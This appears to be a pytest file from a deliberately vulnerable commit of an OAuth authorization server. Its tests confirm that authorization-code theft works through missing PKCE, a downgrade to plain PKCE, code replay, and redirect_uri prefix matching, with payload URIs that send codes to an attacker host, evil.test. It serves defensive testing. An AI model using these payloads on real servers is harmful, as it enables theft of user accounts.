"""Authorization-code theft against our own AS: PKCE, code replay, redirect matching.

PLAN.md step:      3
OWASP:             MCP01, MCP07
Vulnerable commit: (this commit -- the step 3 break)
Findings:          THREAT_MODEL.md (step 3 entries, written with the fix)

!!! BREAK PHASE: every test here asserts the exploit SUCCEEDS. !!!
They invert when the fix lands.

The attacker in all of these holds a stolen authorization code: from a proxy
log, browser history, a malicious app registered on the same custom scheme, or
a redirect it was able to steer. PKCE exists so that a stolen code is useless,
and exact redirect matching exists so that the code is never sent to the
attacker at all.
"""

from urllib.parse import urlsplit

import pytest
from fastapi.testclient import TestClient

from tests.as_fixtures import (
    ORIGIN_CLIENT_ID,
    ORIGIN_REDIRECT_URI,
    authorize_params,
    new_pkce,
    obtain_code,
    redeem,
    sign_in,
)

pytestmark = [pytest.mark.attack, pytest.mark.mcp01, pytest.mark.mcp07]

OK = 200

# --- Exploit 1: PKCE omitted ---------------------------------------------------


def test_code_issued_without_pkce_is_redeemable_by_whoever_holds_it(
    as_client: TestClient,
) -> None:
    params = authorize_params(code_challenge=None, code_challenge_method=None)
    stolen = obtain_code(as_client, params)

    response = redeem(as_client, stolen, verifier=None)

    assert response.status_code == OK
    assert "access_token" in response.json()


# --- Exploit 2: PKCE downgraded to plain ---------------------------------------


def test_plain_challenge_is_the_verifier(as_client: TestClient) -> None:
    """With `plain`, whoever saw the authorization URL holds the verifier."""
    secret = new_pkce().verifier
    params = authorize_params(code_challenge=secret, code_challenge_method="plain")
    stolen = obtain_code(as_client, params)

    observed_in_url = params["code_challenge"]
    response = redeem(as_client, stolen, verifier=observed_in_url)

    assert response.status_code == OK


def test_omitted_method_defaults_to_plain(as_client: TestClient) -> None:
    """RFC 7636's default. The request never even said `plain`."""
    secret = new_pkce().verifier
    params = authorize_params(code_challenge=secret, code_challenge_method=None)
    stolen = obtain_code(as_client, params)

    response = redeem(as_client, stolen, verifier=params["code_challenge"])

    assert response.status_code == OK


def test_metadata_advertises_plain(as_client: TestClient) -> None:
    metadata = as_client.get("/.well-known/oauth-authorization-server").json()

    assert "plain" in metadata["code_challenge_methods_supported"]


# --- Exploit 3: code replay ----------------------------------------------------


def test_code_redeems_twice(as_client: TestClient) -> None:
    pkce = new_pkce()
    code = obtain_code(as_client, authorize_params(pkce))

    legitimate = redeem(as_client, code, verifier=pkce.verifier)
    replayed = redeem(as_client, code, verifier=pkce.verifier)

    assert legitimate.status_code == OK
    assert replayed.status_code == OK
    assert legitimate.json()["access_token"] != replayed.json()["access_token"]
    assert legitimate.json()["refresh_token"] != replayed.json()["refresh_token"]


# --- Exploit 4: redirect_uri prefix matching -----------------------------------
#
# Registered: `https://client.test/cb`. Each payload starts with that string.
# `lands_on` is the host the browser would actually deliver the code to.


@pytest.mark.parametrize(
    ("redirect_uri", "lands_on"),
    [
        ("https://client.test/cb/../../evil", "client.test"),
        ("https://client.test/cb.evil", "client.test"),
        ("https://client.test/cbx", "client.test"),
        ("https://client.test/cb?next=https://evil.test", "client.test"),
        ("https://client.test/cb@evil.test", "client.test"),
    ],
)
def test_prefix_match_accepts_other_paths_on_the_client_host(
    as_client: TestClient, redirect_uri: str, lands_on: str
) -> None:
    response = sign_in(as_client, authorize_params(redirect_uri=redirect_uri))

    assert response.status_code == 303
    location = response.headers["location"]
    assert location.startswith(redirect_uri)
    assert "code=" in location
    assert urlsplit(location).hostname == lands_on


# Registered: the bare origin `https://origin.test`. Now a prefix is a hostname
# prefix, and the code leaves the client's host entirely.


@pytest.mark.parametrize(
    ("redirect_uri", "lands_on"),
    [
        # A subdomain of the attacker's domain, named to look like the client.
        ("https://origin.test.evil.test/steal", "origin.test.evil.test"),
        # Userinfo: everything before `@` is a username, not a host.
        ("https://origin.test@evil.test/steal", "evil.test"),
        ("https://origin.test:443@evil.test/steal", "evil.test"),
    ],
)
def test_prefix_match_on_origin_registration_sends_the_code_off_host(
    as_client: TestClient, redirect_uri: str, lands_on: str
) -> None:
    params = authorize_params(client_id=ORIGIN_CLIENT_ID, redirect_uri=redirect_uri)

    response = sign_in(as_client, params)

    location = response.headers["location"]
    assert location.startswith(ORIGIN_REDIRECT_URI)
    assert "code=" in location
    assert urlsplit(location).hostname == lands_on
